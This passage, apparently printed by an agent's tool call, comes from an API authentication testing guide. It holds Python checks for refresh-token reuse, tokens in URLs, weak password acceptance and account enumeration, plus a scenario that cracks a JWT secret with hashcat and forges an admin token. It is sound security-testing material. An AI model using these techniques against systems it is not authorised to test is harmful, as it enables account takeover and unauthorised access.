token)\n\n# Test 3: Refresh token rotation\nrefresh_token = login_data.get(\"refresh_token\")\nif refresh_token:\n    # Use refresh token\n    refresh_resp = requests.post(f\"{BASE_URL}/auth/refresh\",\n        json={\"refresh_token\": refresh_token})\n    new_tokens = refresh_resp.json()\n\n    # Try to reuse the same refresh token (should fail if rotation is implemented)\n    reuse_resp = requests.post(f\"{BASE_URL}/auth/refresh\",\n        json={\"refresh_token\": refresh_token})\n    if reuse_resp.status_code == 200:\n        print(\"[HIGH] Refresh token reuse allowed - no rotation implemented\")\n\n# Test 4: Token in URL (leakage risk)\nresp = requests.get(f\"{BASE_URL}/users/me?token={token}\")\nif resp.status_code == 200:\n    print(\"[MEDIUM] Token accepted in query parameter - may leak in logs/referrer\")\n```\n\n### Step 6: Password Policy and Credential Testing\n\n```python\n# Test password policy enforcement on registration/change endpoints\nweak_passwords = [\n    \"a\",           # Too short\n    \"password\",    # Common password\n    \"12345678\",    # Numeric only\n    \"abcdefgh\",    # Alpha only, no complexity\n    \"Password1\",   # Meets basic complexity but is common\n    \"\",            # Empty\n    \" \",           # Whitespace\n]\n\nfor pwd in weak_passwords:\n    resp = requests.post(f\"{BASE_URL}/auth/register\",\n        json={\"email\": f\"test_{hash(pwd)%9999}@example.com\",\n              \"password\": pwd, \"name\": \"Test User\"})\n    if resp.status_code in (200, 201):\n        print(f\"[WEAK POLICY] Password accepted: '{pwd}'\")\n\n# Test account enumeration via login response differences\nvalid_email = \"testuser@example.com\"\ninvalid_email = \"nonexistent_user_xyz@example.com\"\n\nresp_valid = requests.post(f\"{BASE_URL}/auth/login\",\n    json={\"username\": valid_email, \"password\": \"wrongpassword\"})\nresp_invalid = requests.post(f\"{BASE_URL}/auth/login\",\n    json={\"username\": invalid_email, \"password\": \"wrongpassword\"})\n\nif resp_valid.text != resp_invalid.text or resp_valid.status_code != resp_invalid.status_code:\n    print(f\"[MEDIUM] Account enumeration possible:\")\n    print(f\"  Valid user: {resp_valid.status_code} - {resp_valid.text[:100]}\")\n    print(f\"  Invalid user: {resp_invalid.status_code} - {resp_invalid.text[:100]}\")\n```\n\n## Key Concepts\n\n| Term | Definition |\n|------|------------|\n| **Broken Authentication** | OWASP API2:2023 - weaknesses in authentication mechanisms that allow attackers to assume identities of legitimate users |\n| **JWT (JSON Web Token)** | Self-contained token format with header.payload.signature structure, used for stateless API authentication |\n| **Token Revocation** | Server-side mechanism to invalidate tokens before their expiration, critical for logout and password change |\n| **Credential Stuffing** | Automated attack using leaked username/password pairs against authentication endpoints |\n| **Account Enumeration** | Determining valid usernames through different error messages or response times for valid vs invalid accounts |\n| **Refresh Token Rotation** | Security practice where each use of a refresh token generates a new one, preventing token reuse attacks |\n\n## Tools & Systems\n\n- **Burp Suite JWT Editor**: Extension for decoding, editing, and re-signing JWT tokens with various attack modes\n- **jwt_tool**: Python tool for JWT testing with 12+ attack modes including alg:none, key confusion, and JWKS spoofing\n- **hashcat**: GPU-accelerated password cracker supporting JWT HMAC secret brute-forcing (mode 16500)\n- **Hydra**: Network login brute-forcer supporting HTTP form-based and API authentication testing\n- **Nuclei**: Template-based scanner with authentication bypass detection templates\n\n## Common Scenarios\n\n### Scenario: SaaS Platform API Authentication Assessment\n\n**Context**: A SaaS platform uses JWT tokens for API authentication. The JWT is issued upon login and used for all subsequent API calls. A refresh token mechanism is also implemented.\n\n**Approach**:\n1. Authenticate and capture the JWT: algorithm is HS256, expiration is 7 days, payload contains user role\n2. Test alg:none bypass: server rejects the token (secure)\n3. Brute force the HMAC secret: discover the secret is \"company-jwt-secret-2023\" (found using hashcat with custom wordlist)\n4. Forge a JWT with admin role using the discovered secret: gain admin access to all endpoints\n5. Test token revocation: tokens remain valid after logout and password change (no blacklist)\n6. Test refresh token: refresh token has no expiration and can be reused indefinitely\n7. Find that the password reset endpoint returns different messages for valid vs invalid emails\n8. Discover that the `/health` and `/metrics` endpoints are accessible without authentication\n\n**Pitfalls**:\n- Only testing the login endpoint and missing authentication weaknesses in password reset, MFA, and token refresh flows\n- Not checking if the JWT secret is the same across all environments (dev, staging, production)\n- Ignoring the token lifetime: a 7-day JWT with no revocation means a stolen token is valid for a week\n","exit_code":0,"status":"completed"}}
